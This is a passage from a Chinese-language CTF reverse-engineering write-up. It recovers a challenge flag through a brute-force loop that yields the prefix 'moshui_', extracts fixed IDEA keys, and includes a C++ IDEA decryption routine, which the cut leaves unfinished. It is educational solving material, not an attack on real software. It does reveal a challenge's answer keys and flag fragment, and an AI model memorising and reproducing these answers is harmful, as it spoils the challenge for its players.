operator\">&lt;</span> <span class=\"token number\">132</span><span class=\"token punctuation\">;</span> c<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">)</span>c <span class=\"token operator\">^</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xB0E0E879</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> enc1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n              <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>得到前七个字符为：<strong>moshui_</strong></p>\n<p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p>\n<p><img src=\"/images/57-1744626745339-63.png\"></p>\n<p><img src=\"/images/58-1744626745339-62.png\"></p>\n<p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p>\n<p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p>\n<p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p>\n<p><img src=\"/images/59-1744626745339-64.png\"></p>\n<p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p>\n<p><img src=\"/images/60-1744626745339-65.png\"></p>\n<p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p>\n<p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p>\n<p><img src=\"/images/61-1744626745339-66.png\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;bitset></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cmath></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;algorithm></span></span>\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> code<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">128</span><span class=\"token operator\">></span> key<span class=\"token punctuation\">;</span>\n\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\ncode <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> code_1 <span class=\"token operator\">^</span> code_2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        tmp <span class=\"token operator\">+=</span> code_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> code_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    tmp <span class=\"token operator\">%=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>code code_in<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">+=</span> code_in<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    tmp <span class=\"token operator\">=</span> <span class=\"token number\">65536</span> <span class=\"token operator\">-</span> tmp<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>code code_1<span class=\"token punctuation\">,</span> code code_2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> tmp_1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> tmp_2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        tmp_1 <span class=\"token operator\">+=</span> code_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        tmp_2 <span class=\"token operator\">+=</span> code_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tmp_1 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        tmp_1 <span class=\"token operator\">=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tmp_2 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        tmp_2 <span class=\"token operator\">=</span> <span class=\"token number\">65536</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tmp_1 <span class=\"token operator\">*</span> tmp_2<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">65537</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>tmp <span class=\"token operator\">==</span> <span class=\"token number\">65536</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>b<span class=\"token punctuation\">)</span>\n        x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">-=</span> a <span class=\"token operator\">/</span> b <span class=\"token operator\">*</span> x<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ncode <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>code code_in<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> tmp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">+=</span> code_in<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token function\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">65537</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Exgcd</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">%</span> p <span class=\"token operator\">+</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token generic-function\"><span class=\"token function\">bitset</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">subkeys_get</span><span class=\"token punctuation\">(</span>code keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    key keys<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            keys<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        key tmp_keys <span class=\"token operator\">=</span> keys <span class=\"token operator\">>></span> <span class=\"token number\">103</span><span class=\"token punctuation\">;</span>\n        keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>keys <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> tmp_keys<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n                sub_key<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    key tmp_keys <span class=\"token operator\">=</span> keys <span class=\"token operator\">>></span> <span class=\"token number\">103</span><span class=\"token punctuation\">;</span>\n    keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>keys <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> tmp_keys<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> keys<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">inv_subkeys_get</span><span class=\"token punctuation\">(</span>code sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">46</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">47</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> cipher<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> I_1<span class=\"token punctuation\">,</span> I_2<span class=\"token punctuation\">,</span> I_3<span class=\"token punctuation\">,</span> I_4<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        I_1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_2<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token 